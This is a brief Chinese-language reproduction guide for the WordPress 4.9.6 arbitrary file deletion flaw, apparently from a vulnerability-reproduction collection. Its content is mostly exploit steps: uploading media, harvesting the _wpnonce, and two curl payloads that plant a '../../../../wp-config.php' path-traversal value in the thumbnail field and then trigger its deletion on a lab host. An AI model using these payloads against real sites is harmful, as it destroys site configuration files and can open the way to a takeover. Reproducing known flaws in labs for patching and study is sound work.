# Wordpress <= 4.9.6 任意文件删除漏洞

### 一、漏洞简介

利用条件L：需要进入后台

### 二、漏洞影响

### 三、复现过程

添加新媒体

访问`http://url/wp-admin/upload.php`，然后上传图片。

![](images/15895250864044.png)


将$ meta ['thumb']设置为我们要删除的文件

单击我们在中上传的图像Step 2，并记住图像的ID。

![](images/15895250942523.png)


访问`http:/url/wp-admin/post.php?post=4&action=edit._wpnonce`在页面源中查找

![](images/15895251130489.png)


发送有效载荷：


```bash
curl -v 'http://url/wp-admin/post.php?post=4' -H 'Cookie: ***' -d 'action=editattachment&_wpnonce=***&thumb=../../../../wp-config.php'
```

![](images/15895251299444.png)


#### 发动攻击

在页面源码中查找 _wpnonce

![](images/15895251439661.png)


发送有效载荷


```bash
curl -v 'http://9c9b.vsplate.me/wp-admin/post.php?post=4' -H 'Cookie: ***' -d 'action=delete&_wpnonce=***'
```

![](images/15895251592825.png)


刷新页面

![](images/15895251670423.png)


